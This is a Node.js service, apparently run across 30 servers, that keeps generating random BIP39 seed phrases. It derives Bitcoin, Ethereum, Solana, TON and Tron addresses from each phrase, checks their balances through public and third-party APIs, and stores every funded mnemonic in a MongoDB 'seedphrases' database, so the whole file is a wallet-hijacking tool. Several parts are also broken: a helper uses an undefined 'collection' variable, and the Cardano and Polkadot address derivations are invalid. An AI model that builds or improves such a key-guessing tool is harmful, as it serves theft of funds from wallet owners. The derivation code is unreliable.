require('dotenv').config();

const express = require('express');
const fetch = require('node-fetch');
const bip39 = require('bip39');
const { BIP32Factory } = require('bip32');
const bitcoin = require('bitcoinjs-lib');
const TronWeb = require('tronweb');
const fs = require('fs');
const ecc = require('tiny-secp256k1');
const { ECPairFactory } = require('ecpair');
const { ethers } = require('ethers');
const crypto = require('crypto');
const { Connection, LAMPORTS_PER_SOL, Keypair } = require('@solana/web3.js');
const nacl = require('tweetnacl');
const { TonClient, WalletContractV4, Address } = require('@ton/ton');
const { mnemonicToWalletKey } = require('@ton/crypto');
const bs58 = require('bs58');
const bech32 = require('bech32');
const { MongoClient } = require('mongodb');

const app = express();
const port = process.env.PORT || 7384;

const bip32 = BIP32Factory(ecc);
const ECPair = ECPairFactory(ecc);

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const networks = {
    bitcoin: {
        lib: bitcoin.networks.bitcoin,
        pathTemplates: [
            { label: 'bip44', path: "m/44'/0'/0'/0/{index}" },
            { label: 'bip49', path: "m/49'/0'/0'/0/{index}" },
            { label: 'bip84', path: "m/84'/0'/0'/0/{index}" }
        ],
        decimals: 8,
        maxIndex: 19
    },
    cardano: {
        pathTemplate: "m/1852'/1815'/0'/0/{index}",  // Cardano Shelley path
        decimals: 6,
        maxIndex: 19
    },
    polkadot: {
        pathTemplate: "m/44'/354'/0'/0'/{index}",  // Polkadot path
        decimals: 10,
        maxIndex: 19
    },
    ethereum: {
        pathTemplate: "m/44'/60'/0'/0/{index}",
        tokens: {
            usdt: {
                address: '0xdac17f958d2ee523a2206206994597c13d831ec7',
                decimals: 6
            }
        },
        decimals: 18,
        maxIndex: 19
    },
    solana: {
        pathTemplate: "m/44'/501'/{index}'/0'",
        decimals: 9,
        maxIndex: 19
    },
    ton: {
        pathTemplate: "m/44'/607'/{index}'/0'",
        decimals: 9,
        maxIndex: 19
    },
    tron: {
        pathTemplate: "m/44'/195'/0'/0/{index}",
        tokens: {
            usdt: {
                address: 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj',
                decimals: 6
            }
        },
        decimals: 6,
        maxIndex: 19
    }
};

// Provider state management
const providerState = {
    lastUsed: new Map(),
    cooldowns: new Map()
};

const apiProviders = {
    ethereum: [
        { name: 'etherscan', baseURL: 'https://api.etherscan.io/v2/api?chainid=1&module=account&action=balance&address={address}&tag=latest', apiKey: process.env.ETHERSCAN_API_KEY, responsePath: 'result' },
        { name: 'infura', baseURL: 'https://mainnet.infura.io/v3/{apiKey}', apiKey: process.env.INFURA_API_KEY, responsePath: 'result' }
    ],
    cardano: [
        { name: 'koios', baseURL: 'https://api.koios.rest/api/v0/address_info', method: 'POST', responsePath: 'amount' },
        { name: 'blockfrost', baseURL: 'https://cardano-mainnet.blockfrost.io/api/v0/addresses/{address}', apiKey: process.env.BLOCKFROST_API_KEY, responsePath: 'amount' }
    ],
    polkadot: [
        { name: 'subscan', baseURL: 'https://polkadot.api.subscan.io/api/v2/scan/account', method: 'POST', responsePath: 'data.account.balance' }
    ],
    bitcoin: [],
    tron: [
        { name: 'trongrid', baseURL: 'https://api.trongrid.io/v1/accounts/{address}', responsePath: 'data[0].balance' },
        { name: 'trongrid2', baseURL: 'https://api2.trongrid.io/v1/accounts/{address}', responsePath: 'data[0].balance' }
    ],
    solana: [
        { name: 'solana1', baseURL: 'https://api.mainnet-beta.solana.com', method: 'getBalance', responsePath: 'value', minIntervalMs: 4000 },
        { name: 'solana2', baseURL: 'https://solana-api.projectserum.com', method: 'getBalance', responsePath: 'value', minIntervalMs: 4000 }
    ],
    ton: [
        { name: 'toncenter', baseURL: 'https://toncenter.com/api/v2/jsonRPC', apiKey: process.env.TONCENTER_API_KEY }
    ]
};

// Lightweight per-provider rate limiter state and helper
const providerRateState = {};
const defaultProviderMinIntervalMs = parseInt(process.env.PROVIDER_MIN_INTERVAL_MS || '1000', 10);

async function waitForProvider(provider) {
    const name = provider && provider.name ? provider.name : 'default';
    if (!providerRateState[name]) providerRateState[name] = { last: 0, cooldownUntil: 0 };

    // Stagger initial requests slightly using SERVER_ID so multiple servers don't hit provider simultaneously
    const serverId = parseInt(process.env.SERVER_ID || '0', 10);
    const stagger = Math.min(1000, serverId * 200);

    const minInterval = typeof provider.minIntervalMs === 'number' ? provider.minIntervalMs : defaultProviderMinIntervalMs;
    const now = Date.now();

    // If provider is in cooldown due to prior 429s, wait until cooldown expires
    if (providerRateState[name].cooldownUntil && providerRateState[name].cooldownUntil > now) {
        await sleep(providerRateState[name].cooldownUntil - now);
    }

    const elapsed = now - providerRateState[name].last;
    if (elapsed < minInterval + stagger) {
        // Add a small random jitter to avoid thundering herd from multiple servers
        const jitter = Math.floor(Math.random() * Math.min(200, minInterval));
        await sleep(minInterval + stagger - elapsed + jitter);
    }
    providerRateState[name].last = Date.now();
}

async function deriveAddress(currency, { seed, root, mnemonic, index = 0, pathTemplate = null }) {
    const network = networks[currency];
    const path = pathTemplate ? pathTemplate.replace('{index}', index.toString()) : (network.pathTemplate ? network.pathTemplate.replace('{index}', index.toString()) : null);
    
    switch (currency) {
        case 'bitcoin': {
            const child = root.derivePath(path);
            const { address } = bitcoin.payments.p2pkh({ pubkey: child.publicKey, network: network.lib });
            return address;
        }
        case 'cardano': {
            // Derive a simpler Cardano address without the full lib
            const addressKey = root.derivePath(path);
            const publicKeyHash = crypto.createHash('sha256')
                .update(addressKey.publicKey)
                .digest();
            // Convert to bech32 format for Cardano
            const words = bech32.toWords(publicKeyHash);
            return bech32.encode('addr', words);
        }
        case 'polkadot': {
            // Derive a simpler Polkadot address without the full lib
            const addressKey = root.derivePath(path);
            const publicKeyHash = crypto.createHash('blake2b512')
                .update(addressKey.publicKey)
                .digest();
            // Use the first 32 bytes and encode in ss58 format
            const ss58Prefix = Buffer.from([0x00]); // Polkadot prefix
            const ss58Hash = crypto.createHash('blake2b512')
                .update(Buffer.concat([ss58Prefix, publicKeyHash.slice(0, 32)]))
                .digest();
            const address = Buffer.concat([
                ss58Prefix,
                publicKeyHash.slice(0, 32),
                ss58Hash.slice(0, 2)
            ]);
            return bs58.encode(address);
        }
        case 'solana': {
            // For Solana, we'll derive different seeds based on index
            const derivedSeed = await bip39.mnemonicToSeed(mnemonic, `solana-${index}`);
            const solanaAccount = Keypair.fromSeed(derivedSeed.slice(0, 32));
            return solanaAccount.publicKey.toBase58();
        }
        case 'ton': {
            // For TON, we'll use the index in the derivation path
            const tonKeys = await mnemonicToWalletKey(mnemonic.split(' '), index);
            const wallet = WalletContractV4.create({ publicKey: tonKeys.publicKey, workchain: 0 });
            return wallet.address.toString({ testOnly: false });
        }
        case 'tron': {
            const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
            const privateKey = root.derivePath(path).privateKey.toString('hex');
            const address = tronWeb.address.fromPrivateKey(privateKey);
            return address;
        }
        default:
            throw new Error(`Unsupported currency for derivation: ${currency}`);
    }
}

const exchangeRateCache = {};
const mobulaSymbols = {
    bitcoin: 'BTC',
    ethereum: 'ETH',
    solana: 'SOL',
    ton: 'TON',
    usdt: 'USDT'
};

async function updateAllExchangeRates() {
    const symbols = Object.values(mobulaSymbols).join(',');
    console.log('Updating exchange rates with CryptoCompare...');
    try {
        const response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=${symbols}&tsyms=USD`);
        const data = await response.json();

        if (response.ok && data.Response !== 'Error') {
            for (const symbol in data) {
                const currency = Object.keys(mobulaSymbols).find(key => mobulaSymbols[key] === symbol);
                if (currency && data[symbol] && data[symbol].USD) {
                    exchangeRateCache[currency] = data[symbol].USD;
                }
            }
            console.log('Exchange rates updated successfully from CryptoCompare.', exchangeRateCache);
        } else {
            console.error('CryptoCompare API error:', data.Message || 'Unknown error');
            console.log('Using hardcoded fallback exchange rates.');
            exchangeRateCache['bitcoin'] = 60000;
            exchangeRateCache['ethereum'] = 3000;
            exchangeRateCache['solana'] = 150;
            exchangeRateCache['ton'] = 6;
            exchangeRateCache['usdt'] = 1;
        }
    } catch (error) {
        console.error('Could not update exchange rates from CryptoCompare:', error);
        console.log('Using hardcoded fallback exchange rates due to fetch error.');
        exchangeRateCache['bitcoin'] = 60000;
        exchangeRateCache['ethereum'] = 3000;
        exchangeRateCache['solana'] = 150;
        exchangeRateCache['ton'] = 6;
        exchangeRateCache['usdt'] = 1;
    }
}

// Helper: insert found balances (native + tokens) into MongoDB with consistent shape
async function handleFoundBalance({ mnemonic, currency, address, index, balances, serverId, network, purpose = null }) {
    const results = [];

    if (balances.native > 0n) {
        const exchangeRate = getExchangeRate(currency);
        const decimals = network.decimals;
        const balanceInMainUnit = parseFloat(ethers.formatUnits(balances.native, decimals));
        const balanceInUSD = balanceInMainUnit * exchangeRate;

        const result = {
            mnemonic,
            currency,
            address,
            derivationIndex: index,
            purpose,
            serverId,
            balance: String(balances.native),
            balanceInUSD: balanceInUSD.toFixed(2),
            timestamp: new Date()
        };
        try {
            await collection.insertOne(result);
        } catch (err) {
            console.warn('Mongo insert warning (native helper):', err && err.message ? err.message : err);
        }
        results.push(result);
    }

    if (balances.tokens) {
        for (const token in balances.tokens) {
            const tokenBalance = balances.tokens[token];
            const tokenInfo = network.tokens && network.tokens[token];
            const tokenDecimals = tokenInfo ? tokenInfo.decimals : 18;
            const tokenExchangeRate = getExchangeRate(token) || 0;

            const balanceInMainUnit = parseFloat(ethers.formatUnits(tokenBalance, tokenDecimals));
            const balanceInUSD = balanceInMainUnit * tokenExchangeRate;

            const result = {
                mnemonic,
                currency,
                address,
                derivationIndex: index,
                purpose,
                token,
                balance: String(tokenBalance),
                balanceInUSD: balanceInUSD.toFixed(2),
                timestamp: new Date()
            };

            try {
                await collection.insertOne(result);
            } catch (err) {
                console.warn('Mongo insert warning (token helper):', err && err.message ? err.message : err);
            }
            results.push(result);
        }
    }

    if (results.length > 0) {
        console.log(`Found and saved: ${JSON.stringify(results)}`);
    }

    return results;
}

function getExchangeRate(currency) {
    return exchangeRateCache[currency] || 0;
}

async function getCardanoBalance(address) {
    try {
        const response = await fetch('https://api.koios.rest/api/v0/address_info', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                _addresses: [address]
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            if (data && data[0] && data[0].balance) {
                return { native: BigInt(data[0].balance) };
            }
        }
    } catch (error) {
        console.error('Error fetching Cardano balance:', error.message);
    }
    return { native: 0n };
}

async function getPolkadotBalance(address) {
    try {
        // Try multiple public RPC endpoints
        const endpoints = [
            'https://rpc.polkadot.io',
            'https://polkadot.api.onfinality.io/public'
        ];
        
        for (const endpoint of endpoints) {
            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "state_getBalance",
                        "params": [address]
                    })
                });

                if (response.ok) {
                    const data = await response.json();
                    if (data && data.result) {
                        return { native: BigInt(data.result.free || '0') };
                    }
                }
            } catch (err) {
                console.log(`Failed with endpoint ${endpoint}, trying next...`);
                continue;
            }
        }
    } catch (error) {
        console.error('Error fetching Polkadot balance:', error.message);
    }
    return { native: 0n };
}

async function getBalance(currency, address) {
    if (currency === 'cardano') {
        return await getCardanoBalance(address);
    }
    if (currency === 'polkadot') {
        return await getPolkadotBalance(address);
    }
    if (currency === 'bitcoin') {
        try {
            const response = await fetch(`https://site--aggregator--g7cy5yrhwfbr.code.run/balance/${address}`);
            if (response.ok) {
                const data = await response.json();
                const balanceInSatoshis = BigInt(Math.round(data.balance * 1e8));
                return { native: balanceInSatoshis };
            }
        } catch (error) {
            console.error('Error fetching from aggregator:', error.message);
        }
        return { native: 0n };
    }

    const providers = apiProviders[currency];
    const network = networks[currency];

    if (!providers || providers.length === 0) {
        if (currency !== 'ton') {
            console.error(`No providers configured for ${currency}`);
        }
        return { native: 0n };
    }

    for (const provider of providers) {
        // Ensure we wait appropriately between requests to this provider
        await waitForProvider(provider);
        let retries = 3;
        let delay = 4000;

        while (retries > 0) {
            try {
                let balance = 0n;

                if (provider.method === 'getBalance') {
                    try {
                        const connection = new Connection(provider.baseURL);
                        const publicKey = new (require('@solana/web3.js').PublicKey)(address);
                        balance = await connection.getBalance(publicKey);
                    } catch (err) {
                        // If the provider returns rate-limit like errors, set cooldown
                        const name = provider && provider.name ? provider.name : 'default';
                        const msg = err && err.message ? err.message.toLowerCase() : '';
                        if (msg.includes('429') || msg.includes('rate')) {
                            const extended = parseInt(process.env.PROVIDER_429_COOLDOWN_MS || '30000', 10);
                            providerRateState[name] = providerRateState[name] || {};
                            providerRateState[name].cooldownUntil = Date.now() + extended;
                        }
                        throw err;
                    }
                } else if (provider.name === 'toncenter') {
                    const client = new TonClient({ endpoint: provider.baseURL, apiKey: provider.apiKey });
                    const tonAddress = Address.parse(address);
                    balance = await client.getBalance(tonAddress);
                } else if (provider.name === 'koios') {
                    const response = await fetch(provider.baseURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            _addresses: [address]
                        })
                    });
                    if (response.ok) {
                        const data = await response.json();
                        if (data && data[0]) {
                            balance = BigInt(data[0].balance || '0');
                        }
                    }
                } else if (provider.name === 'subscan') {
                    const response = await fetch(provider.baseURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            address: address
                        })
                    });
                    if (response.ok) {
                        const data = await response.json();
                        if (data && data.data && data.data.account) {
                            balance = BigInt(data.data.account.balance || '0');
                        }
                    }
                } else { // Generic REST API handler
                    let url = provider.baseURL.replace('{address}', address);
                    if (provider.apiKey) {
                        url += `&apikey=${provider.apiKey}`;
                    }

                    const response = await fetch(url);
                    if (!response.ok) {
                        if (response.status === 429) {
                            // set an extended cooldown for this provider to avoid repeated 429s
                            const name = provider && provider.name ? provider.name : 'default';
                            const extended = parseInt(process.env.PROVIDER_429_COOLDOWN_MS || '30000', 10); // default 30s
                            providerRateState[name] = providerRateState[name] || {};
                            providerRateState[name].cooldownUntil = Date.now() + extended;
                            throw new Error(`API request failed with status 429 (Rate Limited)`);
                        } else {
                            throw new Error(`API request failed with status ${response.status}`);
                        }
                    }

                    let data;
                    if (provider.isText) {
                        data = await response.text();
                    } else {
                        data = await response.json();
                    }

                    if (currency === 'tron' && data.data && data.data.length === 0) {
                        return { native: 0n, tokens: {} };
                    }

                    if (provider.name === 'etherscan' && data.status !== '1') {
                        throw new Error(`Etherscan API error: ${data.message}`);
                    }

                    const getNestedValue = (obj, path) => {
                        return path.split('.').reduce((o, i) => {
                            const match = i.match(/(\w+)\[(\d+)\]/);
                            if (match) {
                                return o && o[match[1]] ? o[match[1]][parseInt(match[2])] : undefined;
                            }
                            return o && o[i];
                        }, obj);
                    };

                    const rawBalance = getNestedValue(data, provider.responsePath);
                    if (typeof rawBalance !== 'undefined' && rawBalance !== null) {
                        balance = BigInt(rawBalance);
                    }
                }

                const result = { native: balance };

                if (currency === 'tron') {
                    console.log(`[TRON DEBUG] Native balance for ${address} is ${balance}. Now checking for TRC-20 tokens.`);
                }

                if (network.tokens) {
                    const tokenBalances = {};
                    for (const token in network.tokens) {
                        const tokenAddress = network.tokens[token].address;
                        let tokenBalance = 0n;

                        if (currency === 'ethereum') {
                            if (token === 'usdt') {
                                console.log(`Checking for USDT (ERC-20) on address ${address}`);
                                const response = await fetch(`https://site--aggregator--g7cy5yrhwfbr.code.run/balance/usdt/erc/${address}`);
                                if (response.ok) {
                                    const data = await response.json();
                                    tokenBalance = BigInt(Math.round(data.balance * (10 ** network.tokens[token].decimals)));
                                }
                            } else {
                                const ethProvider = new ethers.InfuraProvider('mainnet', process.env.INFURA_API_KEY);
                                const contract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)'], ethProvider);
                                tokenBalance = await contract.balanceOf(address);
                            }
                        } else if (currency === 'tron') {
                            console.log(`[TRON DEBUG] Checking for TRC-20 tokens. Current token: '${token}'`);
                            if (token === 'usdt') {
                                console.log(`Checking for USDT (TRC-20) on address ${address}`);
                                try {
                                    const response = await fetch(`https://site--aggregator--g7cy5yrhwfbr.code.run/balance/usdt/trc/${address}`);
                                    if (response.ok) {
                                        const data = await response.json();
                                        tokenBalance = BigInt(Math.round(Number(data.balance) * (10 ** network.tokens[token].decimals)));
                                        console.log(`TRC-20 USDT address: ${address} fetch result: `, JSON.stringify(data), `-> raw token units: ${tokenBalance}`);
                                    } else {
                                        console.warn(`TRC-20 USDT fetch failed for ${address}: ${response.status} ${response.statusText}`);
                                    }
                                } catch (err) {
                                    console.error(`Error fetching TRC-20 USDT balance for ${address}:`, err && err.message ? err.message : err);
                                }
                            } else {
                                try {
                                    const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                                    const contract = await tronWeb.contract().at(tokenAddress);
                                    const balance = await contract.balanceOf(address).call();
                                    tokenBalance = BigInt(balance.toString());
                                    console.log(`TRC-20 token ${token} contract balance for ${address}: raw units: ${tokenBalance}`);
                                } catch (err) {
                                    console.error(`Error reading TRC-20 contract for ${address}:`, err && err.message ? err.message : err);
                                }
                            }
                        }

                        if (tokenBalance > 0n) {
                            tokenBalances[token] = tokenBalance;
                        }
                    }
                    if (Object.keys(tokenBalances).length > 0) {
                        result.tokens = tokenBalances;
                    }
                }

                return result;

            } catch (error) {
                console.error(`Error with ${provider.name} checking ${address} (retries left: ${retries - 1}):`, error.message);
                retries--;
                if (retries > 0) {
                    console.log(`Waiting ${delay / 1000}s before retrying...`);
                    await sleep(delay);
                    delay *= 2;
                } else {
                    console.log(`All retries failed for ${provider.name}. Moving to next provider.`);
                    break;
                }
            }
        }
    }

    return { native: 0n };
}

async function startBot() {
    const serverId = parseInt(process.env.SERVER_ID || '0', 10);
    const totalServers = 30; // Hardcoded total number of servers
    
    if (serverId < 0 || serverId >= totalServers) {
        throw new Error(`Invalid SERVER_ID ${serverId}. Must be between 0 and ${totalServers - 1}`);
    }

    const initialDelay = serverId * 1000;
    console.log(`Server ${serverId} starting with an initial delay of ${initialDelay}ms (${serverId + 1} of ${totalServers} servers)...`);
    await sleep(initialDelay);

    const mongoClient = new MongoClient(process.env.MONGODB_URI);
    await mongoClient.connect();
    const db = mongoClient.db('seedphrases');
    const collection = db.collection('found');

    // Ensure an index to avoid duplicate entries for the same currency/address/index
    try {
        await collection.createIndex({ currency: 1, address: 1, derivationIndex: 1 }, { unique: false });
    } catch (err) {
        console.warn('Could not create MongoDB index:', err && err.message ? err.message : err);
    }

    await updateAllExchangeRates();
    setInterval(updateAllExchangeRates, 2 * 60 * 1000);

    // Define strengths with weights (128 = 12 words, 160 = 15 words, 192 = 18 words, 224 = 21 words, 256 = 24 words)
    const strengthOptions = [
        { value: 128, weight: 70 }, // 70% chance for 12 words
        { value: 160, weight: 10 }, // 10% chance for 15 words
        { value: 192, weight: 10 }, // 10% chance for 18 words
        { value: 224, weight: 5 },  // 5% chance for 21 words
        { value: 256, weight: 5 }   // 5% chance for 24 words
    ];

    while (true) {
        // Calculate total weight
        const totalWeight = strengthOptions.reduce((sum, option) => sum + option.weight, 0);
        // Get a random number between 0 and total weight
        let random = crypto.randomInt(totalWeight);
        // Find the selected option
        let selectedStrength = strengthOptions[0].value;
        for (const option of strengthOptions) {
            if (random < option.weight) {
                selectedStrength = option.value;
                break;
            }
            random -= option.weight;
        }
        const strength = selectedStrength;
        const mnemonic = bip39.generateMnemonic(strength);
        console.log(`Generated Mnemonic (${strength} bits): ${mnemonic}`);
        const seed = await bip39.mnemonicToSeed(mnemonic);
        const root = bip32.fromSeed(seed);

        const currenciesToCheck = ['bitcoin', 'ethereum', 'solana', 'ton', 'tron'];

        // Process each currency sequentially
        const followupProb = parseFloat(process.env.BITCOIN_FOLLOWUP_PROB || '0.05'); // 5% default
        const forceAll = process.env.BITCOIN_CHECK_ALL === 'true';

        for (const currency of currenciesToCheck) {
            const network = networks[currency];
            const maxIndex = network.maxIndex || 0;

            // Check multiple addresses for each currency
            for (let index = 0; index <= maxIndex; index++) {
                // For Bitcoin, use a tiered strategy: check BIP84 first (fast), then follow up with BIP49/BIP44 only when needed
                if (currency === 'bitcoin') {
                    const templates = network.pathTemplates;
                    // find bip84 template first
                    const bip84 = templates.find(t => t.label === 'bip84');
                    const otherTemplates = templates.filter(t => t.label !== 'bip84');

                    // Derive BIP84 (native segwit) first
                    const addr84 = await deriveAddress(currency, { seed, root, mnemonic, index, pathTemplate: bip84.path });
                    if (addr84) {
                        console.log(`Checking: bitcoin (bip84) address ${addr84} (index: ${index})`);
                        const balances84 = await getBalance('bitcoin', addr84);
                        // handle balances as usual
                        if (balances84.native > 0n || (balances84.tokens && Object.keys(balances84.tokens).length > 0)) {
                            // if any funds, record and then check other templates thoroughly
                            // reuse existing handler by making a small helper below
                            await handleFoundBalance({ mnemonic, currency: 'bitcoin', address: addr84, index, balances: balances84, serverId, network });
                            for (const tpl of otherTemplates) {
                                const addr = await deriveAddress(currency, { seed, root, mnemonic, index, pathTemplate: tpl.path });
                                if (!addr) continue;
                                console.log(`Follow-up checking: bitcoin (${tpl.label}) address ${addr} (index: ${index})`);
                                const balances = await getBalance('bitcoin', addr);
                                if (balances.native > 0n || (balances.tokens && Object.keys(balances.tokens).length > 0)) {
                                    await handleFoundBalance({ mnemonic, currency: 'bitcoin', address: addr, index, balances, serverId, network, purpose: tpl.label });
                                }
                                await sleep(3000);
                            }
                        } else {
                            // No funds on bip84 — occasionally probe other templates to catch users on older standards
                            const probe = forceAll || Math.random() < followupProb;
                            if (probe) {
                                for (const tpl of otherTemplates) {
                                    const addr = await deriveAddress(currency, { seed, root, mnemonic, index, pathTemplate: tpl.path });
                                    if (!addr) continue;
                                    console.log(`Probabilistic follow-up checking: bitcoin (${tpl.label}) address ${addr} (index: ${index})`);
                                    const balances = await getBalance('bitcoin', addr);
                                    if (balances.native > 0n || (balances.tokens && Object.keys(balances.tokens).length > 0)) {
                                        await handleFoundBalance({ mnemonic, currency: 'bitcoin', address: addr, index, balances, serverId, network, purpose: tpl.label });
                                    }
                                    await sleep(3000);
                                }
                            }
                        }
                    }
                    // done with this index for bitcoin
                    continue;
                }

                let address;

                if (currency === 'ethereum') {
                    const path = network.pathTemplate.replace('{index}', index.toString());
                    const wallet = ethers.Wallet.fromPhrase(mnemonic, path);
                    address = wallet.address;
                } else {
                    address = await deriveAddress(currency, { seed, root, mnemonic, index });
                }

                if (address) {
                    console.log(`Checking: ${currency} address ${address} (index: ${index})`);
                                        const balances = await getBalance(currency, address);

                    if (balances.native > 0n) {
                        const exchangeRate = getExchangeRate(currency);
                        const decimals = network.decimals;
                        const balanceInMainUnit = parseFloat(ethers.formatUnits(balances.native, decimals));
                        const balanceInUSD = balanceInMainUnit * exchangeRate;

                        const result = {
                            mnemonic,
                            currency,
                            address,
                            derivationIndex: index,
                            serverId: serverId,
                            balance: String(balances.native),
                            balanceInUSD: balanceInUSD.toFixed(2),
                            timestamp: new Date()
                        };

                        try {
                            await collection.insertOne(result);
                        } catch (err) {
                            console.warn('Mongo insert warning (native):', err && err.message ? err.message : err);
                        }
                        console.log(`Found and saved: ${JSON.stringify(result)}`);
                    }

                    if (balances.tokens) {
                        for (const token in balances.tokens) {
                            const tokenBalance = balances.tokens[token];
                            const tokenInfo = network.tokens[token];
                            const tokenDecimals = tokenInfo.decimals || 18;
                            const tokenExchangeRate = getExchangeRate(token) || 0;

                            const balanceInMainUnit = parseFloat(ethers.formatUnits(tokenBalance, tokenDecimals));
                            const balanceInUSD = balanceInMainUnit * tokenExchangeRate;

                            const result = {
                                mnemonic,
                                currency,
                                address,
                                derivationIndex: index,
                                token,
                                balance: String(tokenBalance),
                                balanceInUSD: balanceInUSD.toFixed(2),
                                timestamp: new Date()
                            };

                            try {
                                await collection.insertOne(result);
                            } catch (err) {
                                console.warn('Mongo insert warning (token):', err && err.message ? err.message : err);
                            }
                            console.log(`Found and saved: ${JSON.stringify(result)}`);
                        }
                    }

                    // Add a delay between checking addresses to avoid rate limiting
                    await sleep(3000); // 3 second delay between address checks
                }
            }
        }

        console.log(`Finished checking all currencies for this seed. Waiting before next cycle...`);
        await sleep(5000); // A single pause between each seed phrase cycle
    }
}

app.get('/', (req, res) => {
    res.send('Bot is running...');
});

app.get('/ping', (req, res) => {
    res.status(200).send('Ping successful.');
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
    startBot().catch(console.error);

    // Self-ping mechanism
    setInterval(() => {
        fetch(`http://localhost:${port}/ping`);
    }, 14 * 60 * 1000); // Every 14 minutes
});